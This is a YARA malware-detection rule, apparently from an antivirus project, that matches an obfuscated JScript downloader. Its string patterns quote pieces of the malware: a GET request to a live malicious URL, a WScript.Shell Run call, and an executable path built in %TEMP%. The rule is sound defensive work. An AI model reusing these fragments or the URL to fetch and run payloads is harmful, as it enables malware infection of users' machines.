rule sig_20160328_c27e4d623bf20a92aa15ff0762d51186 {
  meta:
    description = "datamaliciousorder - file 20160328_c27e4d623bf20a92aa15ff0762d51186.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "585c649a8efe94dfee4fb4762db9fa139f944d1a7bd7a2b362741aec3541a03c"

  strings:
    $s1  = "function Wudwjmf() {return Gaduzpyr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"uyEPj0ZDz.exe\";};" fullword ascii
    $s2  = "do {WScript[Jssuqkgye](Ywecjnstgq() * 11)} while (Jowlyfjxqs[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Jowlyfjxqs[Uxavum](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Drqcbbgkj(Fbxwk, Dvwjoz){return Fbxwk - Dvwjoz;};" fullword ascii
    $s5  = "var Gaduzpyr = function Wqisl() {return WScript[Khlbcki](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kquojwkdnt() {return ((Manfxjdr == true) && (Manfxjdr == Lqqulrgwxo)) ? 1 : Ncqpprhtvl;};" fullword ascii
    $s7  = "function Zfqak(Mzfjknf){Gaduzpyr[\"Run\"](Mzfjknf, Ncqpprhtvl, Ncqpprhtvl);};" fullword ascii
    $s8  = "var Manfxjdr = false;" fullword ascii
    $s9  = "function Fhpcptkriz()" fullword ascii
    $s10 = "function Ciyefyabv(Xpkdkjvxm) {var Bodlxs = (1, 2, 3, 4, 5, Xpkdkjvxm); return Bodlxs;};" fullword ascii
    $s11 = "var Vogpypwe = new this[\"Date\"]();" fullword ascii
    $s12 = "function Fizmfgng(){return Khlbcki;};" fullword ascii
    $s13 = "function Mcfgk(){return Hjddfjp;};" fullword ascii
    $s14 = "var Lqqulrgwxo = false;" fullword ascii
    $s15 = "Manfxjdr = true; " fullword ascii
    $s16 = "Lqqulrgwxo = true; " fullword ascii
    $s17 = "return Drqcbbgkj(Dbnineqfd, Swsvxqhirw);" fullword ascii
    $s18 = "var Foqpawsgyy = false;" fullword ascii
    $s19 = "function Ywecjnstgq(){return 22;};" fullword ascii
    $s20 = " while (Dmhgrygs){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}